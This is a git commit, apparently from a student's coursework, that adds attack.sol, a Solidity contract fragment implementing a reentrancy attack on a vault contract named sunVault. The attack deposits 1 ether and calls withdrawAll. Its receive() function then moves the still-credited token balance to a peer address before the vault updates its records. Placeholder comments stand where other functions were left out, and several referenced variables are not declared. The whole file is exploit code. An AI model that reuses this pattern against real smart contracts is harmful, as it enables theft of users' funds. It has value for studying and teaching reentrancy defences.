5b31ef4c2289e4d71b5549b2e743d090d9ab38b5
nitish <nitishdeshpande07@gmail.com>
2024-02-07 12:23:14 +0530

    pehla commit sem 6

---
+++ attack.sol
@@ -0,0 +1,25 @@
+contract Attack {
+
+    // OTHER ATTACK FUNCTIONS ....
+
+    receive() external payable {
+        if (address(sunVault).balance >= 1 ether) {
+            sunToken.transfer(
+                address(attackPeer),
+                sunVault.getUserBalance(address(this))
+            );
+        }
+    }
+
+    function attackInit() external payable {
+        require(msg.value == 1 ether, "Require 1 Ether to attack");
+        sunVault.deposit{value: 1 ether}();
+        sunVault.withdrawAll();
+    }
+
+    function attackNext() external {
+        sunVault.withdrawAll();
+    }
+
+    // OTHER ATTACK FUNCTIONS .....
+}
